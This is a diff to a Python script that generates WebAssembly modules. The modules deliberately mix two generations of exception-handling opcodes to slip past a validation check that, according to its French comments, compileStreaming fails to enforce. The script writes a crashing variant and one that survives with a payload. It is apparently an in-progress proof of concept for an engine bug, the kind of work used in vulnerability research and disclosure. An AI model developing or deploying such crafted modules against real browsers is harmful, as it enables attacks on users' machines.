@@ -13,6 +13,9 @@ Usage: python gen_wasm.py
 
 
 def module(payload=0):
+    # 0x1f = try_table. oui, je melange volontairement deux generations d'EH
+    # (try/catch_all legacy + try_table moderne): c'est pile ce que le controle
+    # de fin de module est cense refuser. compileStreaming ne le fait pas.
     instr = bytearray()
     instr += bytes([0x06, 0x40])                  # try (void)
     instr += bytes([0x01])                        # nop
@@ -35,13 +38,19 @@ def module(payload=0):
     mod = bytearray(b"\x00asm\x01\x00\x00\x00")
     mod += bytes([0x01, len(fonction) + 1, 0x01]) + fonction
     mod += bytes([0x03, 0x02, 0x01, 0x00])
+    # le tag DOIT passer avant export et code. apres, le validateur te jette
+    # avec "invalid section order" et tu perds 10 minutes de ta vie.
     mod += bytes([0x0d, len(tag)]) + tag
     mod += bytes([0x07, 0x07, 0x01, 0x03]) + b"run" + bytes([0x00, 0x00])
+    # taille de section = len(corps) + 2 (le compte du vecteur ET l'octet de taille).
+    # +1 ici et ca parse plus loin que la fin: "parsing ended before the end of Code section".
     mod += bytes([0x0a, len(corps) + 2, 0x01, len(corps)]) + corps
     return bytes(mod)
 
 
 if __name__ == "__main__":
+    # les deux variantes. celle avec payload ne casse pas: c'est deja enorme
+    # par rapport a "ca panic tout le temps". le reste (voir README) est ouvert.
     for nom, p in (("crash_no_payload.wasm", 0), ("survives_with_payload.wasm", 1)):
         data = module(p)
         open(nom, "wb").write(data)
